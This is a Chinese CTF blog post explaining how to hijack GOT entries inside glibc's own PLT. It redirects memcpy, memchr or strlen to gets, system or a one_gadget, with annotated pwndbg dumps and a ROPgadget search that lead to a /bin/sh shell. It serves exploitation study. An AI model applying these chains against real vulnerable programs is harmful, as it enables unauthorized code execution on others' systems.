---
title: "Hijack Glibc Got"
description: "劫持glibc got表的多种利用姿势。"
date: "2025-04-21"
# weight: 1
# aliases: ["/first"]
categories: ["daily"]
tags: ["ctf"]
draft: false
hidemeta: false
ShowCanonicalLink: false
disableHLJS: true # to disable highlightjs
disableShare: true
hideSummary: false
searchHidden: false
cover:
    image: "cover.webp" # image path/url
    # caption: "some text..." # display caption under cover
---

# 利用方法

首先，动态调试跟进libc代码，找call到libc plt表（`.plt.sec`段）中的函数，或者IDA找`j_`开头的函数调用，劫持这些函数的got表。

**如果只有一次写入机会**：将got表覆盖为one_gadget一次执行，不满足条件也没有办法。

**如果有多次写入机会**：

1. 将got表覆盖为one_gadget，如果不满足ogg条件，可以找以`call`指令结尾的gadgets来中转控制寄存器等，为ogg创造利用条件；
2. 将got表覆盖为其他函数，利用已知调用链调用`system("/bin/sh")`

{{< collapse summary=Example >}}

调用：

```asm
.text:0000000000082A18                 call    j_memchr
```

plt：

```asm
.plt.sec:0000000000026470 ; __int64 __fastcall j_memchr()
.plt.sec:0000000000026470 j_memchr        proc near               ; CODE XREF: sub_35A20+D5↓p
.plt.sec:0000000000026470                                         ; sub_35A20+14B↓p ...
.plt.sec:0000000000026470                 endbr64
.plt.sec:0000000000026474                 jmp     cs:off_1FE040
.plt.sec:0000000000026474 j_memchr        endp
```

got：

```asm
.got.plt:00000000001FE040 off_1FE040      dq offset memchr        ; DATA XREF: j_memchr+4↑r
.got.plt:00000000001FE040                                         ; Indirect relocation
```

{{< /collapse >}}



# 常见函数调用

> 用glibc2.38看的，其他版本仅作参考。
>
> 只粗略看了一下大概有些什么调用，具体还要动调看能否走到这些分支。

```text
printf -> __vfprintf_internal -> __printf_buffer -> j_strchrnul
                                                 -> __printf_buffer_write -> j_memcpy_0

scanf -> j_strlen, j_free, ...(分支太多了看不过来，动调吧)

gets -> __uflow -> j_free
     -> _IO_getline -> _IO_getline_info -> __uflow -> j_free
                                        -> j_memchr, j_memcpy_0

puts -> j_strlen

exit -> __call_tls_dtors -> j_free
     -> j_free

__stack_chk_fail -> __fortify_fail -> j_strchrnul, j_strlen, j_mempcpy
```



# 执行binsh

## printf

**利用方法**：

1. 将`printf`中`memcpy_0.got`覆盖为`gets`，输入`“//bin/sh\x00”`
2. 将`gets`中`memchr.got`覆盖为`system`

> [!caution]
>
> 注意要在`/bin/sh\x00`最前面加一个除`\n`外的任意字符！！！这里多加了个`/`

**执行流**：

```text
printf -> __vfprintf_internal -> __printf_buffer -> __printf_buffer_write -> j_memcpy_0
gets -> _IO_getline -> _IO_getline_info -> __uflow
                                        -> j_memchr
```

**原理**：

当执行到`<__printf_buffer_write+67>  call j_memcpy_0`时，`$rdi`为栈地址可写，故此时将`memcpy.got`覆盖为`gets`可以将字符串读入栈内存：

```gdb {hide=true}
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────
 RAX  4
 RBX  0x2a
 RCX  0
 RDX  0x2a
 RDI  0x7fff0352b410 ◂— "He opens his mouth but the words don't come out... "
 RSI  0x5ade8bd2a0d8 ◂— "\nHe's chokin how, everbody's jokin now... "
 R8   0xa
 R9   0
 R10  0
 R11  0x737a914038e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 R12  0x2a
 R13  0x7fff0352b3e0 —▸ 0x7fff0352b410 ◂— "He opens his mouth but the words don't come out... "
*R14  0x5ade8bd2a102 ◂— 0x6c43000000000000
 R15  0x5ade8bd2a102 ◂— 0x6c43000000000000
 RBP  0x7fff0352ae70 —▸ 0x7fff0352b3a0 —▸ 0x7fff0352b4d0 —▸ 0x7fff0352b5b0 —▸ 0x7fff0352b5f0 ◂— ...
 RSP  0x7fff0352ae50 —▸ 0x5ade8bd2a0d8 ◂— "\nHe's chokin how, everbody's jokin now... "
*RIP  0x737a91260d83 (__printf_buffer_write+67) ◂— call *ABS*+0xb1720@plt
──────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────
   0x737a91260d73 <__printf_buffer_write+51>    mov    rsi, r14     RSI => 0x5ade8bd2a0d8 ◂— "\nHe's chokin how, everbody's jokin now... "
   0x737a91260d76 <__printf_buffer_write+54>    cmp    rbx, r12     0x80 - 0x2a     EFLAGS => 0x216 [ cf PF AF zf sf IF df of ]
   0x737a91260d79 <__printf_buffer_write+57>  ✔ cmova  rbx, r12
   0x737a91260d7d <__printf_buffer_write+61>    mov    rdx, rbx     RDX => 0x2a
   0x737a91260d80 <__printf_buffer_write+64>    add    r14, rbx     R14 => 0x5ade8bd2a102 (0x5ade8bd2a0d8 + 0x2a)
 ► 0x737a91260d83 <__printf_buffer_write+67>    call   *ABS*+0xb1720@plt           <*ABS*+0xb1720@plt>
        rdi: 0x7fff0352b410 ◂— "He opens his mouth but the words don't come out... "
        rsi: 0x5ade8bd2a0d8 ◂— "\nHe's chokin how, everbody's jokin now... "
        rdx: 0x2a
        rcx: 0
 
   0x737a91260d88 <__printf_buffer_write+72>    mov    rdi, qword ptr [r13 + 8]
   0x737a91260d8c <__printf_buffer_write+76>    add    rdi, rbx
   0x737a91260d8f <__printf_buffer_write+79>    mov    qword ptr [r13 + 8], rdi
   0x737a91260d93 <__printf_buffer_write+83>    sub    r12, rbx
   0x737a91260d96 <__printf_buffer_write+86>    je     __printf_buffer_write+160   <__printf_buffer_write+160>
───────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────
In file: /usr/src/glibc/glibc-2.39/string/bits/string_fortified.h:29
   24 
   25 __fortify_function void *
   26 __NTH (memcpy (void *__restrict __dest, const void *__restrict __src,
   27                size_t __len))
   28 {
 ► 29   return __builtin___memcpy_chk (__dest, __src, __len,
   30                                  __glibc_objsize0 (__dest));
   31 }
   32 
   33 __fortify_function void *
   34 __NTH (memmove (void *__dest, const void *__src, size_t __len))
───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsp 0x7fff0352ae50 —▸ 0x5ade8bd2a0d8 ◂— "\nHe's chokin how, everbody's jokin now... "
01:0008│-018 0x7fff0352ae58 ◂— 0
02:0010│-010 0x7fff0352ae60 —▸ 0x7fff0352b3e0 —▸ 0x7fff0352b410 ◂— "He opens his mouth but the words don't come out... "
03:0018│-008 0x7fff0352ae68 —▸ 0x7fff0352b4e0 ◂— 0x3000000008
04:0020│ rbp 0x7fff0352ae70 —▸ 0x7fff0352b3a0 —▸ 0x7fff0352b4d0 —▸ 0x7fff0352b5b0 —▸ 0x7fff0352b5f0 ◂— ...
05:0028│+008 0x7fff0352ae78 —▸ 0x737a9126910c (__printf_buffer+140) ◂— mov eax, dword ptr [r13 + 0x20]
06:0030│+010 0x7fff0352ae80 ◂— 0x300000000
07:0038│+018 0x7fff0352ae88 —▸ 0x7fff0352b070 —▸ 0x7fff0352b080 ◂— '126970258541530'
─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
 ► 0   0x737a91260d83 __printf_buffer_write+67
   1   0x737a91260d83 __printf_buffer_write+67
   2   0x737a9126910c __printf_buffer+140
   3   0x737a9126b73b __vfprintf_internal+571
   4   0x737a912601b3 printf+179
   5   0x5ade8bd292cc main+227
   6   0x737a9122a1ca __libc_start_call_main+122
   7   0x737a9122a28b __libc_start_main+139
```

执行到`gets+60`时会将`_IO_2_1_stdin_._IO_read_ptr`处的1个字符取出来判断是否为`\n`，是则直接返回。而此时`_IO_2_1_stdin_._IO_read_ptr`指向的是上一次输入时的最后一个字符，因此利用时要注意调用printf前，**上一次输入时的字符串构造成不以`\n`结尾**：

```gdb {hide=true}
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────
 RAX  0x59a6693cb2bf ◂— 0xa /* '\n' */
 RBX  0x7fffa1de0710 ◂— "He opens his mouth but the words don't come out... "
 RCX  0
 RDX  0x2a
 RDI  0x73b35fe038e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 RSI  0x59a647bfd0d8 ◂— "\nHe's chokin how, everbody's jokin now... "
 R8   0xa
 R9   0
 R10  0
 R11  0x73b35fe038e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 R12  0x73b35fe038e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 R13  0x73b35fe046b0 (stdin) —▸ 0x73b35fe038e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 R14  0x73b35ff01740 ◂— 0x73b35ff01740
 R15  0x59a647bfd102 ◂— 0x6c43000000000000
 RBP  0x7fffa1de0140 —▸ 0x7fffa1de0170 —▸ 0x7fffa1de06a0 —▸ 0x7fffa1de07d0 —▸ 0x7fffa1de08b0 ◂— ...
 RSP  0x7fffa1de0110 —▸ 0x73b35fdcce17 (dot) ◂— 0x707472617473002e /* '.' */
*RIP  0x73b35fc870bc (gets+60) ◂— lea rdx, [rax + 1]
──────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────
   0x73b35fc8719f <gets+287>    jmp    gets+43                     <gets+43>
    ↓
   0x73b35fc870ab <gets+43>     mov    rdi, r12                        RDI => 0x73b35fe038e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
   0x73b35fc870ae <gets+46>     mov    rax, qword ptr [rdi + 8]        RAX, [_IO_2_1_stdin_+8] => 0x59a6693cb2bf ◂— 0xa /* '\n' */
   0x73b35fc870b2 <gets+50>     cmp    rax, qword ptr [rdi + 0x10]     0x59a6693cb2bf - 0x59a6693cb2c0     EFLAGS => 0x287 [ CF PF af zf SF IF df of ]
   0x73b35fc870b6 <gets+54>     jae    gets+246                    <gets+246>
 
 ► 0x73b35fc870bc <gets+60>     lea    rdx, [rax + 1]                  RDX => 0x59a6693cb2c0 ◂— 0
   0x73b35fc870c0 <gets+64>     mov    qword ptr [rdi + 8], rdx        [_IO_2_1_stdin_+8] <= 0x59a6693cb2c0 ◂— 0
   0x73b35fc870c4 <gets+68>     movzx  eax, byte ptr [rax]             EAX, [0x59a6693cb2bf] => 0xa
   0x73b35fc870c7 <gets+71>     mov    rdx, rbx                        RDX => 0x7fffa1de0710 ◂— "He opens his mouth but the words don't come out......"
   0x73b35fc870ca <gets+74>     cmp    eax, 0xa                        0xa - 0xa     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ]
   0x73b35fc870cd <gets+77>     jne    gets+320                    <gets+320>
───────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────
In file: /usr/src/glibc/glibc-2.39/libio/iogets.c:38
   33   size_t count;
   34   int ch;
   35   char *retval;
   36 
   37   _IO_acquire_lock (stdin);
 ► 38   ch = _IO_getc_unlocked (stdin);
   39   if (ch == EOF)
   40     {
   41       retval = NULL;
   42       goto unlock_return;
   43     }
───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsp 0x7fffa1de0110 —▸ 0x73b35fdcce17 (dot) ◂— 0x707472617473002e /* '.' */
01:0008│-028 0x7fffa1de0118 ◂— 0
02:0010│-020 0x7fffa1de0120 ◂— 0x2a /* '*' */
03:0018│-018 0x7fffa1de0128 ◂— 0x2a /* '*' */
04:0020│-010 0x7fffa1de0130 —▸ 0x7fffa1de06e0 —▸ 0x7fffa1de0710 ◂— "He opens his mouth but the words don't come out... "
05:0028│-008 0x7fffa1de0138 —▸ 0x59a647bfd102 ◂— 0x6c43000000000000
06:0030│ rbp 0x7fffa1de0140 —▸ 0x7fffa1de0170 —▸ 0x7fffa1de06a0 —▸ 0x7fffa1de07d0 —▸ 0x7fffa1de08b0 ◂— ...
07:0038│+008 0x7fffa1de0148 —▸ 0x73b35fc60d88 (__printf_buffer_write+72) ◂— mov rdi, qword ptr [r13 + 8]
─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
 ► 0   0x73b35fc870bc gets+60
   1   0x73b35fc60d88 __printf_buffer_write+72
   2   0x73b35fc60d88 __printf_buffer_write+72
   3   0x73b35fc6910c __printf_buffer+140
   4   0x73b35fc6b73b __vfprintf_internal+571
   5   0x73b35fc601b3 printf+179
   6   0x59a647bfc2cc main+227
   7   0x73b35fc2a1ca __libc_start_call_main+122
```

而后将先调用`gets -> _IO_getline -> _IO_getline_info -> __uflow`读入字符串`"//bin/sh"`（**注意要在`/bin/sh`前面加一个除`\n`外的任意字符！！！**），之后执行到`<_IO_getline_info+104>  call j_memchr`时，`$rdi`为我们刚才输入字符串的第2个字符（跳过了第一个字符，所以才需要在输入时最前面补一个空格），故将`memchr.got`覆盖为`system`将执行`system("/bin/sh")`：

```gdb {hide=true}
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────
 RAX  0x2f
 RBX  0x7ffe1cb4e112 ◂— " opens his mouth but the words don't come out... "
 RCX  0x78b76491ba61 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  7
 RDI  0x6133f3d4c2a1 ◂— 'bin/sh\n11111111 '
 RSI  0xa
 R8   0
 R9   0
 R10  0
 R11  0x246
*R12  7
 R13  0x7ffffffe
 R14  0x6133f3d4c2a1 ◂— 'bin/sh\n11111111 '
 R15  0x78b764a038e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
 RBP  0x7ffe1cb4db00 —▸ 0x7ffe1cb4db40 —▸ 0x7ffe1cb4db70 —▸ 0x7ffe1cb4e0a0 —▸ 0x7ffe1cb4e1d0 ◂— ...
 RSP  0x7ffe1cb4dab0 ◂— 0
*RIP  0x78b764886f38 (_IO_getline_info+104) ◂— call *ABS*+0xb15b0@plt
──────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────
   0x78b764886f28 <_IO_getline_info+88>     cmp    rdx, r13                        0x7 - 0x7ffffffe     EFLAGS => 0x297 [ CF PF AF zf SF IF df of ]
   0x78b764886f2b <_IO_getline_info+91>     mov    esi, dword ptr [rbp - 0x38]     ESI, [0x7ffe1cb4dac8] => 0xa
   0x78b764886f2e <_IO_getline_info+94>     mov    rdi, r14                        RDI => 0x6133f3d4c2a1 ◂— 'bin/sh\n11111111 '
   0x78b764886f31 <_IO_getline_info+97>     cmova  rdx, r13
   0x78b764886f35 <_IO_getline_info+101>    mov    r12, rdx                        R12 => 7
 ► 0x78b764886f38 <_IO_getline_info+104>    call   *ABS*+0xb15b0@plt           <*ABS*+0xb15b0@plt>
        rdi: 0x6133f3d4c2a1 ◂— 'bin/sh\n11111111 '
        rsi: 0xa
        rdx: 7
        rcx: 0x78b76491ba61 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
 
   0x78b764886f3d <_IO_getline_info+109>    mov    r8, rax
   0x78b764886f40 <_IO_getline_info+112>    test   rax, rax
   0x78b764886f43 <_IO_getline_info+115>    jne    _IO_getline_info+240        <_IO_getline_info+240>
 
   0x78b764886f45 <_IO_getline_info+117>    mov    rdi, rbx
   0x78b764886f48 <_IO_getline_info+120>    mov    rdx, r12
───────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────
In file: /usr/src/glibc/glibc-2.39/libio/iogetline.c:85
   80       else
   81         {
   82           char *t;
   83           if ((size_t) len >= n)
   84             len = n;
 ► 85           t = (char *) memchr ((void *) fp->_IO_read_ptr, delim, len);
   86           if (t != NULL)
   87             {
   88               size_t old_len = ptr-buf;
   89               len = t - fp->_IO_read_ptr;
   90               if (extract_delim >= 0)
───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe1cb4dab0 ◂— 0
01:0008│-048 0x7ffe1cb4dab8 ◂— 0x40 /* '@' */
02:0010│-040 0x7ffe1cb4dac0 —▸ 0x7ffe1cb4e111 ◂— "/ opens his mouth but the words don't come out... "
03:0018│-038 0x7ffe1cb4dac8 ◂— 0x78b70000000a /* '\n' */
04:0020│-030 0x7ffe1cb4dad0 ◂— 0x12
05:0028│-028 0x7ffe1cb4dad8 —▸ 0x7ffe1cb4e110 ◂— " / opens his mouth but the words don't come out... "
06:0030│-020 0x7ffe1cb4dae0 —▸ 0x78b764a038e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
07:0038│-018 0x7ffe1cb4dae8 —▸ 0x78b764a046b0 (stdin) —▸ 0x78b764a038e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
 ► 0   0x78b764886f38 _IO_getline_info+104
   1   0x78b76488707c None
   2   0x78b7648871ee gets+366
   3   0x78b764860d88 __printf_buffer_write+72
   4   0x78b764860d88 __printf_buffer_write+72
   5   0x78b76486910c __printf_buffer+140
   6   0x78b76486b73b __vfprintf_internal+571
   7   0x78b7648601b3 printf+179
```



# 执行gadget为ogg创造条件

> 之前一直不知道为什么ROPgadget会给一些`call xxx`结尾的gadgets，感觉屁用没有，如今才恍然大悟……

**方法**：找一些以`call`结尾的gadgets作为中转布置ogg需要的条件。

**举例**：假设执行one_gadget时缺少`$rax=0`的条件，于是找到

```bash
$ ROPgadget --binary ./libc.so.6 | grep call
...
0x00000000001746f7 : xor rax, rax ; call 0x264f0
```

这里call的其实是`strlen.plt`：

```asm
.plt.sec:00000000000264F0 ; __int64 __fastcall j_strlen(_QWORD, _QWORD, _QWORD)
.plt.sec:00000000000264F0 j_strlen        proc near               ; CODE XREF: __gconv_open+78↓p
.plt.sec:00000000000264F0                                         ; __gconv_open+124↓p ...
.plt.sec:00000000000264F0                 endbr64
.plt.sec:00000000000264F4                 jmp     cs:off_1FE080
.plt.sec:00000000000264F4 j_strlen        end
```

将ogg写入`strlen.got`，先执行gadget提前设置`$rax=0`，之后`call strlen.plt`时将跳转到ogg执行。